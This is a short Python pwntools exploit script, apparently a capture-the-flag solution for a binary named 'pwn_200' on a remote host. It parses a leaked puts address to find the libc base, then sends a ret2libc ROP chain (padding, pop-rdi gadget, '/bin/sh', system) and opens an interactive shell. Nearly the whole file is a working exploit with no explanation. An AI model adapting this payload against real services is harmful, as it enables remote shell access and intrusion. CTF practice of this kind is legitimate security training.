#!/usr/bin/env python3
# DarkSide
# leax was here
# niggurath was here

from pwn import *

LOCAL = False
context.binary = binary = '/root/Desktop/pwn_200'
out_elf = ELF(binary)
context.log_level = 'debug'
libc = ELF("./libc.so.6")
elf = ELF("/root/Desktop/pwn_200")

OFFSET = 12
prefix = b"4919"
junk = b"A" * OFFSET

if LOCAL == False:
    p = remote('52.33.132.169', 1442, ssl=False)
else:
    p = process('/root/Desktop/pwn_200')

payload = b""
addr = p.recvuntil(">")
putsaddr = int(str(addr).split(": ")[1][:-4],16)
print("Addr Leak: ")
print(putsaddr)
#Payload
libc.address = putsaddr - libc.symbols['puts'] #Addres real libc
sysaddr = libc.sym['system']
shaddr = next(libc.search(b'/bin/sh\x00'))

print("System Addr: ",sysaddr)
print("sh addr: ", shaddr)
print("libc main addresss:", libc.address )
p.sendline(prefix)
addr2 = p.recvuntil("Bienvenido jefe ;)")
#Payload 2
#rop gadget 0x00000000004013b3
leak = flat(
    'A'*12,
    0x4013b3, #rdi
    shaddr,
    0x40101a, #ret
    sysaddr, #funcion a saltar
    endianness = 'little', word_size = 64,sign = False
    )
    
p.sendline(leak)
p.interactive()

# Falto agregar SETUID(0)
